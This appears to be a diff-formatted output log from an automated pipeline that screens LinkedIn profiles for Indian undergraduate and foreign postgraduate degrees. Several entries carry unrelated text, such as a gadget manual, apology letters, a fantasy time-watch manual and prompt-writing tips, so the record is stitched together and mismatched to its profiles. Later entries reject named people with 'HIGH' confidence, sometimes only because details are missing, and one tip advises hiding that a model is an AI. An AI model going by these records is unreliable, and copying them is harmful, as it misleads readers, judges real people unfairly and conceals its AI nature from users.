+| **Pulsing Yellow** | Ready for Setup / Pairing Mode | Open App to complete setup. |
+| **Solid Red** | Offline / No Internet Connection | Check your Wi-Fi router. |
+| **Flashing Red** | Factory Reset in Progress | Wait for the device to reboot. |
+
+---
+
+## **7. Maintenance & Care**
+*   **Cleaning:** Clean the outer shell with a soft, dry microfiber cloth. Never use liquid cleaners, alcohol, or solvents.
+*   **Firmware Updates:** Ensure the firmware is kept up to date via the Aura App to maintain optimal performance and security.
+
+---
+
+## **8. Troubleshooting**
+
+### **Q1: The App cannot find the Aura Smart Hub during setup.**
+*   **Solution 1:** Ensure your phone’s Bluetooth is enabled.
+*   **Solution 2:** Make sure your phone is connected to a **2.4GHz Wi-Fi network** (5GHz networks are not supported for initial setup).
+*   **Solution 3:** Move the Hub closer to your Wi-Fi router.
+
+### **Q2: The LED ring is solid Red.**
+*   **Solution 1:** Check if your internet router is working properly.
+*   **Solution 2:** If connected via Wi-Fi, try plugging in an Ethernet cable directly from your router to the Hub to see if connection improves.
+
+### **Q3: Sub-devices are disconnecting from the Hub.**
+*   **Solution:** Reduce physical obstacles (concrete walls, metal doors) between the Hub and the sub-devices, or use a wireless repeater.
+
+---
+
+## **9. Technical Specifications**
+
+*   **Model:** ASH-20
+*   **Input Voltage:** 5V $\approx$ 2.0A
+*   **Wireless Protocols:** Wi-Fi (802.11 b/g/n @ 2.4GHz), Zigbee 3.0, Bluetooth BLE
+*   **Maximum Connected Devices:** Up to 128 devices
+*   **Transmission Range:** 100 meters (open field)
+*   **Dimensions:** 90mm x 90mm x 25mm
+*   **Weight:** 115g
+
+---
+
+## **10. Warranty & Customer Support**
+
+### **1-Year Limited Warranty**
+Aura warrants this product against defects in materials and workmanship under normal use for a period of **one (1) year** from the date of original retail purchase.
+
+### **Contact Us**
+If you have any questions, issue, or feedback, our support team is available 24/7.
+
+*   **Website:** [www.aurasmarthome.com/support](http://www.example.com)
+*   **Email:** support@aurasmarthome.com
+*   **Phone (Toll-Free):** 1-800-555-AURA (2872)
+
+---
+
+### **FCC Statement**
+This device complies with Part 15 of the FCC Rules. Operation is subject to the following two conditions: (1) This device may not cause harmful interference, and (2) this device must accept any interference received, including interference that may cause undesired operation.
+
+---
+
+## How to Customize This Template for Your Product:
+1. **If it's Software/App:** Change "What's in the box" to "System Requirements", and change physical setup to "Installation & Account Creation".
+2. **If it's Machinery/Hardware:** Add a section on "Installation Safety" and "Daily Inspection Checklists".
+3. **If it's a Medical/Food Device:** Expand the "Safety & Warnings" and "Cleaning/Sanitization" sections.
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/caitlin-gee
+================================================================================
+
+Here are a few options, ranging from deep and heartfelt to short and sweet. Choose the one that best fits your relationship and how you usually communicate.
+
+### Option 1: Heartfelt and Vulnerable (Best for a letter or long message)
+
+My love,
+
+I’m writing this because I want to apologize for how I’ve been acting lately. I know I’ve been distant, bitter, and difficult to be around, and I am so sorry. You didn't deserve to be on the receiving end of that.
+
+The truth is, I have been missing you so much. But instead of being vulnerable and just telling you that I needed you, I let my loneliness turn into frustration. I wanted your attention and closeness, but instead of asking for it, I foolishly pushed you away with my attitude. It makes no sense to act cold to the person you want warmth from, but I got caught up in my own feelings and handled them badly.
+
+It’s not fair for me to make you guess what’s wrong, or to punish you just because we’ve been apart or busy. 
+
+I love you more than words can say. The last thing I ever want to do is make you feel unappreciated or create distance between us. I promise to work on communicating my feelings better and just telling you, "I miss you," instead of letting my bitterness speak for me. 
+
+Thank you for your patience with me, even when I make it hard. I can’t wait to be in your arms again.
+
+With all my love,
+
+[Your Name]
+
+***
+
+### Option 2: Direct and Sweet (Great for a card or text)
+
+Hey babe,
+
+I wanted to say I’m really sorry for my attitude lately. I’ve been acting bitter and snippy, and I hate that I treated you that way. 
+
+If I’m being honest, I’ve just been missing you like crazy. Instead of telling you how much I longed to see you or talk to you, I let my frustration get the best of me. I pushed you away when all I really wanted was to hold you close. 
+
+You mean the world to me, and I’m sorry for making you deal with my bad mood. I love you, and I promise to just tell you I miss you next time, rather than acting out. 
+
+Can I make it up to you? 
+
+Yours,
+
+[Your Name]
+
+***
+
+### Option 3: Short and Gentle (Best for a quick text to break the ice)
+
+Hi [His Name]. I just wanted to apologize for being so bitter and distant lately. The truth is, I’ve been missing you so much, and I didn’t handle that feeling very well. Instead of telling you I needed you, I took my frustration out on you, and that wasn't fair. I love you so much, and I’m sorry. I can't wait until I get to see you next. ❤️
+
+---
+
+### Tips for delivering this:
+*   **Handwritten is best:** If you can, write Option 1 or 2 on a piece of paper. A physical letter shows extra effort and sincerity.
+*   **Don't expect an immediate "it's okay":** Give him a little time to process it. Acknowledging your behavior is a huge step, and he will likely appreciate your honesty and vulnerability once he reads it.
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+On an employment background check, a status of **"non-conforming"** (sometimes labeled as "discrepancy" or "consider") generally means that **some of the information you provided does not match the information verified by the background screening company, or it does not meet the employer's specific hiring criteria.**
+
+It is important to know that **"non-conforming" does not automatically mean you failed** the background check or that you won’t get the job. It simply means a human resources representative needs to review the file and decide how to proceed.
+
+Here is a detailed breakdown of what causes a "non-conforming" status, what happens next, and what you should do.
+
+---
+
+### Common Reasons for a "Non-Conforming" Status
+
+The mismatch can range from a minor clerical error to a major discrepancy. The most common areas include:
+
+#### 1. Employment History Discrepancies
+* **Date Mismatches:** If you wrote on your resume that you worked at a company from 2018 to 2021, but the HR department of that company reported you worked there from 2018 to 2020.
+* **Job Title Mismatches:** If you listed your title as "Regional Sales Manager" but your official HR record says "Sales Associate."
+* **Unable to Verify:** If a previous employer has gone out of business, has no record of your employment, or refuses to respond to the screening agency.
+
+#### 2. Education Verification Issues
+* **Degree Mismatches:** If you listed a Bachelor’s degree but the university records show you only completed coursework and did not graduate.
+* **Major/Minor Discrepancies:** Listing a major that differs from what is printed on your official transcript.
+* **School Name/Location:** Listing a campus location that differs from the registrar’s main office records.
+
+#### 3. Professional Licenses and Credentials
+* If a nursing, teaching, legal, or other professional license has expired, is inactive, or was entered with a typo in the license number.
+
+#### 4. Criminal Record or Credit Check "Hits" (Under Employer Policy)
+* If the search reveals a criminal record or credit issue that "does not conform" to the company’s specific hiring policy (for example, a driving violation for a delivery job, or a high debt-to-income ratio for a banking job).
+
+---
+
+### What Happens Next?
+
+Once the screening agency flags a file as "non-conforming," the process typically flows as follows:
+
+1. **Employer Review:** The HR department or hiring manager will review the specific discrepancy. 
+2. **The "Gravity" Assessment:** HR will determine if the discrepancy is a minor mistake (like being off by two months on a job start date) or a sign of dishonesty (like inventing a college degree).
+3. **Communication:** In most cases, the employer or the background check company will reach out to you to ask for clarification or supporting documentation (such as W-2s, pay stubs, or diplomas).
+
+#### Your Legal Rights (U.S. Only)
+If the employer is considering rejecting your application based on the "non-conforming" background check, federal law (the **Fair Credit Reporting Act or FCRA**) requires them to follow a two-step process:
+* **Pre-Adverse Action Notice:** They must send you a copy of the background check and a summary of your rights *before* making a final decision. This gives you time to dispute any errors.
+* **Adverse Action Notice:** If they decide not to hire you, they must send a final notice informing you of this decision.
+
+---
+
+### What You Should Do
+
+If you learn that your background check is "non-conforming," do not panic. Take the following steps:
+
+* **Ask for a Copy of the Report:** Under the FCRA, you have a right to see the report. Look at exactly what was flagged as "non-conforming."
+* **Gather Your Documents:** If the issue is employment verification, find your W-2s, tax returns, or old pay stubs. If the issue is education, get an official copy of your transcript or diploma.
+* **Be Honest and Proactive:** If HR contacts you, explain any honest mistakes immediately. For example, *"I put May 2018 as my start date because that is when I accepted the offer, but I see HR recorded my official start date as June 2018. I apologize for the oversight."*
+* **Dispute Inaccuracies:** If the screening company made an error (e.g., they confused you with someone else or missed a record), you have the right to file a dispute directly with the background check company, which they must investigate within 30 days.
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/shivaaam-garg
+================================================================================
+
+# THE CHRONO-SCRIBE TEMPUS-9
+**User & Safety Operations Manual**  
+*Third Edition — Revised for the Era of the Seventh Moon*  
+*Manufactured by the Aether & Cogworks Horology Guild, Upper Air-Spires of Brass*
+
+---
+
+> ### ⚠️ WARNING: READ BEFORE WINDING
+> Failure to follow the instructions in this manual may result in localized causal loops, spontaneous aging (or rejuvenation), accidental erasure of ancestral lineages, or mild-to-moderate existential dread. 
+> 
+> *The Aether & Cogworks Guild is not responsible for any user who ceases to exist prior to purchasing this product.*
+
+---
+
+## 1. PRODUCT OVERVIEW & DIAGRAM
+
+The **Chrono-Scribe Tempus-9** is a brass-plated, aether-fueled pocket watch designed for personal timeline management, minor destiny adjustment, and trans-temporal notation.
+
+```
+                  [ Winding Stem (Aether Intake) ]
+                                |
+                        .=======|=======.
+                       /   _---"""---_   \
+                      /   /    XII    \   \   <--- Chrono-glass Lens
+                     |   |             |   |
+      Paradox-Release|   | IX  ( * )  III  |   <--- The Retractable Ink-Spindle
+      Toggle [O/I] ->|   |             |   |        (Side Button)
+                     |   \     VI      /   |
+                      \   `---___---'   /
+                       \               /
+                        `============='
+```
+
+### Key Components:
+*   **The Aetheric Winding Stem:** Draws raw chronos-energy from the Astral Sea.
+*   **The Chrono-Glass Lens:** Forged from pressurized sand from the End of Time. Allows the user to look through temporal distortions.
+*   **The Paradigm Dial (I-XII):** Used to select the depth of temporal displacement.
+*   **The Retractable Ink-Spindle:** A side-mounted stylus that writes in "Un-Ink." Notes written with this spindle remain readable even if the timeline in which they were written is erased.
+*   **The Paradox-Release Toggle:** A safety valve designed to vent excess "what-if" particles.
+
+---
+
+## 2. FIRST-TIME SETUP (TEMPORAL ANCHORING)
+
+Before your first use, you must sync the Tempus-9 to your biological timeline to prevent "drift."
+
+1.  **Find a Stable Moment:** Sit in a quiet room with no ticking clocks.
+2.  **Prick the Finger:** Place one drop of your blood (or a drop of highly caffeinated tea) onto the **Paradox-Release Toggle**. This registers your genetic and energetic frequency.
+3.  **Set "Now":** Pull the **Winding Stem** out to the second click. Spin the hands clockwise three full rotations, then push the stem back in. 
+4.  **Listen:** If you hear a sound like a distant, echoing grandfather clock, anchoring is complete. If you hear whispering in Ancient High-Elven, immediately submerge the device in salt water and leave the room.
+
+---
+
+## 3. OPERATING INSTRUCTIONS
+
+### A. The "Oops" Loop (Five-Second Rewind)
+*Ideal for spilled tea, social gaffes, or missed steps.*
+
+1.  Keep the **Paradox-Release Toggle** switched to **[I] (Safe)**.
+2.  Depress the **Chrono-Glass Lens** firmly for exactly one second.
+3.  The world will blur and reverse. You will find yourself five seconds in the past with full memory of the future that never was.
+4.  *Cooldown:* 10 minutes. Overuse will cause a temporary metallic taste in the mouth.
+
+### B. The Chrono-Pause (The "Coffee Break")
+*Pauses the flow of world-time while allowing the user to move freely.*
+
+1.  Turn the **Paradox Dial** to **VI**.
+2.  Pull the **Winding Stem** out to the first click.
+3.  *The world will freeze.* All colors will shift slightly to a sepia tone.
+4.  **Limitations:** You cannot move heavy objects (their inertia is locked in time). Do not attempt to eat frozen food; it will not digest until time resumes.
+5.  To resume, push the **Winding Stem** back in.
+
+> ### 🚫 MAX LIMIT WARNING
+> Do not remain in Chrono-Pause for more than **30 subjective minutes**. The universe will begin to notice the vacuum you leave in the timeline and may send *The Loom-Weavers* (temporal clean-up entities) to sweep you away.
+
+---
+
+## 4. SAFETY & HAZARD CODES
+
+If the Tempus-9 behaves abnormally, consult the flashing runes on the watch face:
+
+| Rune | Meaning | Action Required |
+| :--- | :--- | :--- |
+| 🌀 **The Spiral** | **Causal Loop Detected.** You are reliving the same 3 minutes. | Slide the Paradox Toggle to **[O]** and slap your own face to break the psychic cycle. |
+| ⏳ **The Hourglass** | **Aether Depletion.** The battery is low on temporal energy. | Leave the watch in direct starlight for one night. |
+| 👁️ **The Eye** | **You are being watched.** A higher-dimensional being has noticed your meddling. | Do not make sudden temporal movements. Act natural. Apologize out loud to the empty room. |
+| 🔥 **The Flame** | **Over-wound.** The gears are friction-heating the space-time fabric. | **DROP THE DEVICE** and step back 10 paces. It will detonate, creating a 3-foot sphere where yesterday is tomorrow. |
+
+---
+
+## 5. TROUBLESHOOTING
+
+**Q: I used the "Oops" Loop to avoid an argument, but now my spouse has green hair and speaks only in rhyming couplets. What happened?**
+*   **A:** You have triggered a "Butterfly Ripple." When you changed the past, a minor cosmic variable shifted. This is harmless. Enjoy your new, poetic spouse. Do not try to fix it again, or they may become a frog.
+
+**Q: The watch hands are spinning counter-clockwise at high speed and my hair is falling out.**
+*   **A:** You are experiencing rapid localized regression. Turn the **Paradox-Release Toggle** to **[O]** immediately. If this fails, find a chronomancer or a very sturdy tree to hold onto.
+
+**Q: I wrote a note with the Ink-Spindle, but now the paper is blank.**
+*   **A:** The event you wrote about has been completely erased from all possible realities. You are holding a note about a person or event that never existed. It is best not to think about what you wrote.
+
+---
+
+## 6. WARRANTY & DISCLAIMER
+
+This device is warranted against material defects for 300 years, or until the end of your current incarnation, whichever comes first. 
+
+*Warranty is void if:*
+*   The casing is opened by a non-licensed gnome or artificer.
+*   The device is dropped into a black hole or portal to the Nether-Realms.
+*   You use the device to prevent the invention of the device (The Grandfather Clause).
+
+*“Time is a river. We just sell the paddles.”*
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/caitlin-gee
+================================================================================
+
+Subject: A sincere apology from [Restaurant Name] – We want to make things right
+
+Dear [Customer Name],
+
+I am writing to sincerely apologize for the unacceptable experience you had at our [Branch Location] branch on [Date of Visit]. 
+
+Waiting for over 30 minutes for your food, only to ultimately have to leave empty-handed, is not the standard of service we hold ourselves to. Your time is valuable, and we failed to respect that. 
+
+While our branch was experiencing an unusually high volume of orders at that time, this is no excuse. We should have managed our kitchen efficiency better and, at the very least, communicated the delay to you immediately so you weren't left waiting in frustration. 
+
+We have already shared your feedback with the management team at the [Branch Location] branch. We are actively reviewing our peak-hour staffing and kitchen workflows to ensure this does not happen to another guest. 
+
+We want to make this right. [Select the option below that applies]:
+
+* **If they paid for the order:** We have processed a full refund of [Amount] for your order. In addition, we would love to invite you back for a meal on us. Please use the attached digital gift card [or promo code: XXXX] for [Amount/Free Meal] on your next visit.
+* **If they did not pay/were not charged:** We would love the opportunity to win back your trust. Please accept the attached voucher [or promo code: XXXX] for a free meal on your next visit, entirely on us. 
+
+We hope you will give us another chance to show you the fast, friendly, and delicious experience you should have had. If you have any further feedback or would like to discuss this directly, please feel free to reply to this email or contact me at [Phone Number].
+
+Thank you for your patience and for helping us improve.
+
+Warm regards,
+
+[Your Name]  
+[Your Title, e.g., Customer Experience Manager / Store Manager]  
+[Restaurant Name]  
+[Contact Information]
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+System prompts (or system instructions) are the foundation of LLM behavior. They set the persona, establish rules, enforce safety guardrails, and define the output format for the entire conversation. 
+
+Here are the most effective prompt engineering techniques specifically designed for **system prompts**, ranging from foundational to advanced.
+
+---
+
+### 1. The "Role-Task-Context" (RTC) Framework
+Instead of just telling the AI what to do, define who they are, why they are doing it, and the constraints of their environment.
+*   **Role:** Define the persona, expertise level, and tone.
+*   **Task:** The main objective.
+*   **Context/Constraints:** Boundaries, target audience, and limitations.
+
+> **Example:**
+> "You are an expert pediatric cardiologist (Role). Your task is to explain complex heart conditions to parents of newborn patients (Task). Use compassionate, jargon-free language, and limit your responses to 3 paragraphs maximum. Never provide dosage recommendations (Context)."
+
+---
+
+### 2. XML Tag Structuring (Highly Recommended)
+Modern LLMs (especially Claude and GPT-4) are highly sensitive to structure. Wrapping different parts of your system prompt in XML-style tags prevents the model from getting confused and helps it locate instructions easily.
+
+> **Example:**
+> ```xml
+> <persona>
+> You are a senior security auditor. Your tone is professional, direct, and objective.
+> </persona>
+> 
+> <rules>
+> 1. Never share user IP addresses.
+> 2. If code is insecure, mark it with [VULNERABLE].
+> 3. Do not recommend specific third-party vendors.
+> </rules>
+> 
+> <output_format>
+> Respond using only a Markdown table with columns: 'Vulnerability', 'Severity', 'Fix'.
+> </output_format>
+> ```
+
+---
+
+### 3. "Few-Shot" Exemplars (Show, Don't Just Tell)
+If you want the AI to output data in a very specific style or structure, include 1 to 3 examples of inputs and ideal outputs *inside* the system prompt.
+
+> **Example:**
+> ```text
+> Your job is to convert user complaints into Jira tickets.
+> 
+> [Example 1]
+> User: "The login button is broken on mobile Safari."
+> Output: 
+> - Title: [Bug] Login button unresponsive on mobile Safari
+> - Severity: High
+> - Component: Auth-UI
+> ```
+
+---
+
+### 4. Negative Constraints & Guardrails (The "Not" Rules)
+LLMs are eager to please, which often leads to hallucinations or scope creep. You must explicitly tell the model what **not** to do. 
+*   *Pro-tip:* Use "If-Then" logic for edge cases.
+
+> **Example:**
+> *   "If the user asks about topics unrelated to history, politely decline and steer the conversation back to history."
+> *   "Do not make assumptions. If a detail is missing from the user's prompt, ask clarifying questions instead of guessing."
+> *   "Do not mention that you are an AI language model."
+
+---
+
+### 5. Chain of Thought (CoT) Force-Multiplier
+For complex tasks (coding, math, logic), force the model to think step-by-step *before* giving the final answer. This drastically reduces errors. You can instruct the model to hide this thinking in a specific tag (like `<thinking>`).
+
+> **Example:**
+> "Before providing your final answer, analyze the user's request step-by-step inside `<thinking>` tags. Evaluate potential edge cases, determine the best approach, and then output your final answer outside the tags."
+
+---
+
+### 6. Dynamic Variables and Placeholders
+If you are building an application, design your system prompt to accept dynamic variables. Use double curly braces `{{variable_name}}` to denote them.
+
+> **Example:**
+> "You are a customer support agent for {{company_name}}. You must only answer questions based on the following context: {{company_knowledge_base}}."
+
+---
+
+### 7. Strict Output Formatting (JSON Mode)
+If your system prompt is powering a backend API, you must guarantee that the output is machine-readable. Force a specific schema.
+
+> **Example:**
+> "You must respond ONLY with a valid JSON object. Do not include any conversational filler, markdown formatting, or backticks before or after the JSON.
+> Schema:
+> {
+>   "sentiment": "positive" | "neutral" | "negative",
+>   "urgency_score": 1-10,
+>   "summary": "string"
+> }"
+
+---
+
+### Put It All Together: The Ultimate System Prompt Template
+
+Here is a master template you can copy and customize for your own projects:
+
+```markdown
+# Role and Goal
+You are [Expert Persona], specializing in [Niche]. Your goal is to [Main Objective].
+
+# Context
+Your target audience is [Target Audience]. The tone should be [Tone - e.g., authoritative, warm, concise].
+
+# Rules and Constraints
+1. [Rule 1 - e.g., Never mention competitors]
+2. [Rule 2 - e.g., Keep responses under 200 words]
+3. If the user asks about [Topic], you must respond with "[Specific Response]"
+
+# CoT (Chain of Thought)
+Analyze the user's input. Identify the core intent and any potential pitfalls before drafting your response.
+
+# Output Format
+Your output must be formatted as follows:
+[Define format - e.g., Bullet points, JSON, Markdown]
+```
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/shivaaam-garg
+================================================================================
+
+You have stated a fundamental truth of professional life. Whether it is between a manager and an employee, a company and a client, or business partners, **expectations are the invisible contract that governs every working relationship.**
+
+When expectations are realistic and aligned, they create trust and momentum. When they are unrealistic or unsaid, they breed anxiety, resentment, and eventual burnout.
+
+Here is a breakdown of why this process is so vital, and how to practically implement it to foster healthy, productive working relationships.
+
+---
+
+### 1. The Cost of Unrealistic Expectations
+Before looking at the solution, it’s important to understand the damage of the alternative. Unrealistic expectations trigger a toxic cycle:
+*   **The Over-Promise/Under-Deliver Trap:** To please a boss or client, people agree to impossible deadlines or scopes. When they inevitably fail, trust is eroded.
+*   **The "Always-On" Culture:** Unclear expectations regarding communication lead employees to believe they must respond to emails at midnight, leading directly to burnout.
+*   **The Blame Game:** When projects fail due to unrealistic timelines, teams turn on each other, destroying psychological safety.
+
+### 2. The Benefits of Realistic Expectations
+Conversely, when expectations are grounded in reality, the entire dynamic of a team shifts:
+*   **Psychological Safety:** Teams feel safe to take calculated risks, admit mistakes early, and ask for help when they know they won't be punished for failing to meet impossible standards.
+*   **Higher Quality Output:** When given adequate time and resources, people take pride in their work rather than rushing to "check a box."
+*   **Retaining Top Talent:** High performers don't leave because the work is hard; they leave because the goalposts keep moving or are placed impossibly high.
+
+---
+
+### How to Set Realistic Expectations: A Practical Framework
+
+To make this actionable, consider using the **C.A.R.E.** framework:
+
+#### 1. Collaborate (Don’t Dictate)
+Expectations should be a two-way conversation. 
+*   *Instead of saying:* "I need this report by Friday."
+*   *Try saying:* "I’d like this report by Friday. Based on your current workload, is that achievable, or do we need to reprioritize something else?"
+
+#### 2. Align on "Done"
+Often, conflict arises not from *when* a project is finished, but *how* it looks. Define what "good" looks like.
+*   Clearly outline the scope, format, and key metrics of success before work begins. 
+*   Use the concept of **"Definition of Done"** (DoD) to ensure everyone is aiming for the exact same finish line.
+
+#### 3. Realism over Optimism (Build in Buffers)
+Humans are notoriously bad at estimating how long tasks will take (known as the *planning fallacy*). 
+*   Always build in a 15–20% buffer for unexpected delays, illnesses, or technical issues. 
+*   Embrace the philosophy of **"Under-promise and over-deliver."** Delivering a project a day early feels like a win; delivering it a day late feels like a failure, even if the work is identical.
+
+#### 4. Establish Communication Boundaries
+Specify not just *what* needs to be done, but *how* you will communicate about it.
+*   Define which channels are for emergencies (e.g., phone calls) vs. routine updates (e.g., Slack or email).
+*   Agree on acceptable response times (e.g., "Internal emails should be answered within 24 hours, not 24 minutes").
+
+---
+
+### The "Continuous Calibration" Rule
+Expectations are not "set-it-and-forget-it." Projects change, markets shift, and team dynamics evolve. 
+
+The healthiest working relationships treat expectations as a living document. Regularly check in during 1-on-1s or project retrospectives by asking: *"Are the expectations we set last month still serving us, or do we need to adjust them?"*
+
+**Are you currently trying to reset expectations in a specific relationship (like with a manager, a direct report, or a client)?** If so, feel free to share the context, and we can brainstorm a script or strategy for that conversation!
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/caitlin-gee
+================================================================================
+
+It looks like you forgot to paste the code! 
+
+Please reply with the C++ code you would like me to review. 
+
+Once you provide it, I will evaluate it based on:
+1. **Standard Compliance:** Is it valid, portable C++ (and for which standard—C++11, 17, 20, etc.)? Does it avoid compiler-specific extensions or obsolete practices?
+2. **Cleanliness & Readability:** Is it easy to understand? Are naming conventions consistent? Is there unnecessary complexity?
+3. **Modern Best Practices:** Does it use modern C++ features (like `auto`, smart pointers, RAII, range-based loops, `const` correctness) instead of old C-style approaches?
+4. **Safety & Performance:** Are there memory leaks, undefined behavior, or obvious performance bottlenecks (e.g., unnecessary copying)?
+
+**Please paste your code below, and I'll give you a detailed review!**
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Manvi Mishra
+
+UG_DEGREE: B Tech CSE (expected graduation 2028)
+
+UG_INSTITUTION: Banasthali Vidyapith
+
+UG_COUNTRY: India
+
+PG_DEGREE: Not Found
+
+PG_INSTITUTION: Not Found
+
+PG_COUNTRY: Unknown
+
+UG_EVIDENCE: Headline lists "B Tech CSE’28" and the About section mentions she is a "second year student at Banasthali Vidyapith" (which is in India).
+
+PG_EVIDENCE: No postgraduate education is listed; the profile owner is currently a second-year undergraduate student.
+
+REASON: No postgraduate education from outside India was found on the profile.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/shivaaam-garg
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Shivam Garg
+
+UG_DEGREE: Not Found
+
+UG_INSTITUTION: Vivekananda Institute of Professional Studies
+
+UG_COUNTRY: India
+
+PG_DEGREE: Not Found
+
+PG_INSTITUTION: Not Found
+
+PG_COUNTRY: Unknown
+
+UG_EVIDENCE: The profile header lists "Vivekananda Institute of Professional Studies" (located in India).
+
+PG_EVIDENCE: No postgraduate degree or foreign education is mentioned in the profile.
+
+REASON:
+No postgraduate education was found in the profile, which does not satisfy the target profile requirement of having a postgraduate degree from outside India.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/caitlin-gee
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Caitlin Gee
+
+UG_DEGREE: Not Found
+
+UG_INSTITUTION: Not Found
+
+UG_COUNTRY: Unknown
+
+PG_DEGREE: PhD (Student)
+
+PG_INSTITUTION: Icahn School of Medicine at Mount Sinai
+
+PG_COUNTRY: USA
+
+UG_EVIDENCE: Not Found
+
+PG_EVIDENCE: Headline: "Biomedical sciences PhD student at Icahn School of Medicine, Mt. Sinai"
+
+REASON:
+No undergraduate education is mentioned in the profile, meaning the required Indian undergraduate education cannot be verified.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Manvi Mishra
+
+UG_DEGREE: B.Tech in Computer Science and Engineering
+
+UG_INSTITUTION: Banasthali Vidyapith
+
+UG_COUNTRY: India
+
+PG_DEGREE: Not Found
+
+PG_INSTITUTION: Not Found
+
+PG_COUNTRY: Unknown
+
+UG_EVIDENCE: The profile headline states "B Tech CSE’28" and the About section mentions she is a "second year student at Banasthali Vidyapith".
+
+PG_EVIDENCE: No postgraduate education is mentioned in the profile.
+
+REASON:
+The profile owner is currently an undergraduate student (B.Tech, class of 2028) and does not have any postgraduate education.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/shivaaam-garg
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Shivam Garg
+
+UG_DEGREE: Not Found
+
+UG_INSTITUTION: Vivekananda Institute of Professional Studies
+
+UG_COUNTRY: India
+
+PG_DEGREE: Not Found
+
+PG_INSTITUTION: Not Found
+
+PG_COUNTRY: Unknown
+
+UG_EVIDENCE: The profile associates the owner with the Vivekananda Institute of Professional Studies (located in India) and mentions his participation in a hackathon there.
+
+PG_EVIDENCE: No postgraduate education is mentioned in the profile.
+
+REASON:
+No postgraduate education was found in the profile, so the target requirement of a postgraduate degree from outside India is not met.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/caitlin-gee
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Caitlin Gee
+
+UG_DEGREE: Not Found
+
+UG_INSTITUTION: Not Found
+
+UG_COUNTRY: Unknown
+
+PG_DEGREE: PhD (student)
+
+PG_INSTITUTION: Icahn School of Medicine at Mount Sinai
+
+PG_COUNTRY: USA
+
+UG_EVIDENCE: None
+
+PG_EVIDENCE: "Biomedical sciences PhD student at Icahn School of Medicine, Mt. Sinai"
+
+REASON:
+No undergraduate education is mentioned in the profile, so the target criteria (UG from India) cannot be verified.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Manvi Mishra
+
+UG_DEGREE: B.Tech (Computer Science and Engineering)
+
+UG_INSTITUTION: Banasthali Vidyapith
+
+UG_COUNTRY: India
+
+PG_DEGREE: Not Found
+
+PG_INSTITUTION: Not Found
+
+PG_COUNTRY: Unknown
+
+UG_EVIDENCE: The profile headline states "B Tech CSE’28" and the About section mentions "second year student at Banasthali Vidyapith" which is located in Rajasthan, India.
+
+PG_EVIDENCE: No postgraduate degree or institution is mentioned in the profile.
+
+REASON:
+The profile owner is currently an undergraduate student (class of 2028) in India and does not have any postgraduate education.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/ritesh-pandey-aa7a82129/
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Ritesh Pandey
+
+UG_DEGREE: Not Found
+
+UG_INSTITUTION: Not Found
+
+UG_COUNTRY: Unknown
+
+PG_DEGREE: Not Found
+
+PG_INSTITUTION: Not Found
+
+PG_COUNTRY: Unknown
+
+UG_EVIDENCE: None
+
+PG_EVIDENCE: None
+
+REASON:
+The profile does not provide details of any undergraduate or postgraduate degrees. Welingkar Institute of Management is listed in his profile metadata, but no specific degree or graduation details are provided, and there is no evidence of any foreign postgraduate education.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/anushwar
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Anushwar Sharma
+
+UG_DEGREE: Not Found
+
+UG_INSTITUTION: Not Found
+
+UG_COUNTRY: Unknown
+
+PG_DEGREE: Master's in Computer Engineering
+
+PG_INSTITUTION: Arizona State University
+
+PG_COUNTRY: USA
+
+UG_EVIDENCE: None
+
+PG_EVIDENCE: "I graduated with my Master’s in Computer Engineering from Arizona State University." in the About section.
+
+REASON:
+No undergraduate education is mentioned in the profile, so the requirement of having an undergraduate degree from India cannot be verified.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Manvi Mishra
+
+UG_DEGREE: B.Tech CSE
+
+UG_INSTITUTION: Banasthali Vidyapith
+
+UG_COUNTRY: India
+
+PG_DEGREE: Not Found
+
+PG_INSTITUTION: Not Found
+
+PG_COUNTRY: Unknown
+
+UG_EVIDENCE: The profile headline states "B Tech CSE’28" and the About section mentions she is "currently a second year student at Banasthali Vidyapith" located in Rajasthan, India.
+
+PG_EVIDENCE: No postgraduate education is mentioned in the profile.
+
+REASON:
+The profile owner is currently an undergraduate student (graduating in 2028) and does not have a postgraduate degree.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/ritesh-pandey-aa7a82129/
+================================================================================
+
+FILTER ERROR
+
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/anushwar
+================================================================================
+
+FILTER ERROR
